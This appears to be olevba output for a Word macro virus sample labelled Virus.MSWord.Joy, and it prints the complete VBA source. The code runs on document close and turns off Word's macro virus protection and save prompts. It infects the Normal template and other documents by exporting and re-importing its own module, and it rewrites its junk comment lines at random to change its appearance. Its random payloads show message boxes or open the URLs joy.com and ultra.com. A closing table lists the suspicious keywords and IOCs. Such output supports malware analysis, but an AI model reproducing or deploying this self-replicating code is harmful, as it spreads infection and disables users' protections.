olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Joy-12cb6c8d05d44d2cd20f2f054045848b7ad68703
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Joy-12cb6c8d05d44d2cd20f2f054045848b7ad68703 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'/!:*6:*'&=BJ5/!:**6J5=BJ5/&=BJ5/:*'&=BJ5/!:**6J5=BJ5/&=BJ5/
Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize
'. 7)57)&#<AG4. 7))5G4<AG4.#<AG4.7)&#<AG4. 7))5G4<AG4.#<AG4.
On Error GoTo 85
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
Options.VirusProtection = False
'.#9)89))%<DI4.#9))8I4<DI4.%<DI4.9))%<DI4.#9))8I4<DI4.%<DI4.
Options.SaveNormalPrompt = False
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
Options.ConfirmConversions = False
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'1";,7;,('?CK71";,,7K7?CK71'?CK71;,('?CK71";,,7K7?CK71'?CK71
dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.
If dt > 0 And rt > 0 Then GoTo 85
'1#8,88,)$?DH71#8,,8H7?DH71$?DH718,)$?DH71#8,,8H7?DH71$?DH71
If dt = 0 Then
'.#8)88))$<DH4.#8))8H4<DH4.$<DH4.8))$<DH4.#8))8H4<DH4.$<DH4.
    Set Joy = NormalTemplate.VBProject.VBComponents
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
    Set hst = ActiveDocument.VBProject.VBComponents
'0"9+79+(%>CI60"9++7I6>CI60%>CI609+(%>CI60"9++7I6>CI60%>CI60
    lx = Int(Rnd(1) * 100) + 1
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'4 8/58/&$BAH:4 8//5H:BAH:4$BAH:48/&$BAH:4 8//5H:BAH:4$BAH:4
    lr = Int(Rnd(1) * 75) + 1
'.!8)68)'$<BH4.!8))6H4<BH4.$<BH4.8)'$<BH4.!8))6H4<BH4.$<BH4.
    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'. 9)59)&%<AI4. 9))5I4<AI4.%<AI4.9)&%<AI4. 9))5I4<AI4.%<AI4.
    ls = Int(Rnd(1) * 50) + 1
'. 8)58)&$<AH4. 8))5H4<AH4.$<AH4.8)&$<AH4. 8))5H4<AH4.$<AH4.
    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'-":(7:((&;CJ3-":((7J3;CJ3-&;CJ3-:((&;CJ3-":((7J3;CJ3-&;CJ3-
    lt = Int(Rnd(1) * 25) + 1
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical
'-!9(69('%;BI3-!9((6I3;BI3-%;BI3-9('%;BI3-!9((6I3;BI3-%;BI3-
    hst.Item(1).Name = Joy.Item(1).Name
'0 9+59+&%>AI60 9++5I6>AI60%>AI609+&%>AI60 9++5I6>AI60%>AI60
    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'5$90990*%CEI;5$9009I;CEI;5%CEI;590*%CEI;5$9009I;CEI;5%CEI;5
End If
'3"7.77.(#ACG93"7..7G9ACG93#ACG937.(#ACG93"7..7G9ACG93#ACG93
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
'5%80:80+$CFH;5%800:H;CFH;5$CFH;580+$CFH;5%800:H;CFH;5$CFH;5
Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
With Joy.Item(1).codemodule
'/#7*87*)#=DG5/#7**8G5=DG5/#=DG5/7*)#=DG5/#7**8G5=DG5/#=DG5/
    For j = 1 To 4
'. 9)59)&%<AI4. 9))5I4<AI4.%<AI4.9)&%<AI4. 9))5I4<AI4.%<AI4.
    .deletelines 1
'/"7*77*(#=CG5/"7**7G5=CG5/#=CG5/7*(#=CG5/"7**7G5=CG5/#=CG5/
    Next j
'5!70670'#CBG;5!7006G;CBG;5#CBG;570'#CBG;5!7006G;CBG;5#CBG;5
    End With
'-!8(68('$;BH3-!8((6H3;BH3-$;BH3-8('$;BH3-!8((6H3;BH3-$;BH3-
If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'-$8(98(*$;EH3-$8((9H3;EH3-$;EH3-8(*$;EH3-$8((9H3;EH3-$;EH3-
If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"
'.&9);9),%<GI4.&9));I4<GI4.%<GI4.9),%<GI4.&9));I4<GI4.%<GI4.
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'.#?)8?))+<DO4.#?))8O4<DO4.+<DO4.?))+<DO4.#?))8O4<DO4.+<DO4.
With Joy.Item(1).codemodule
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2
'.&7);7),#<GG4.&7));G4<GG4.#<GG4.7),#<GG4.&7));G4<GG4.#<GG4.
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'-!8(68('$;BH3-!8((6H3;BH3-$;BH3-8('$;BH3-!8((6H3;BH3-$;BH3-
    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)
'. ;)5;)&'<AK4. ;))5K4<AK4.'<AK4.;)&'<AK4. ;))5K4<AK4.'<AK4.
    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)
'4$8/98/*$BEH:4$8//9H:BEH:4$BEH:48/*$BEH:4$8//9H:BEH:4$BEH:4
    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr
'- 7(57(&#;AG3- 7((5G3;AG3-#;AG3-7(&#;AG3- 7((5G3;AG3-#;AG3-
Next j
'.#7)87))#<DG4.#7))8G4<DG4.#<DG4.7))#<DG4.#7))8G4<DG4.#<DG4.
End With
'-(7(=7(.#;IG3-(7((=G3;IG3-#;IG3-7(.#;IG3-(7((=G3;IG3-#;IG3-
85:
'-#7(87()#;DG3-#7((8G3;DG3-#;DG3-7()#;DG3-#7((8G3;DG3-#;DG3-
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'.#7)87))#<DG4.#7))8G4<DG4.#<DG4.7))#<DG4.#7))8G4<DG4.#<DG4.
End Sub
'.#9)89))%<DI4.#9))8I4<DI4.%<DI4.9))%<DI4.#9))8I4<DI4.%<DI4.
Sub ToolsMarco()
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
End Sub
'.!9)69)'%<BI4.!9))6I4<BI4.%<BI4.9)'%<BI4.!9))6I4<BI4.%<BI4.

'/"8*78*($=CH5/"8**7H5=CH5/$=CH5/8*($=CH5/"8**7H5=CH5/$=CH5/

'-!8(68('$;BH3-!8((6H3;BH3-$;BH3-8('$;BH3-!8((6H3;BH3-$;BH3-
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
+----------+--------------------+---------------------------------------------+

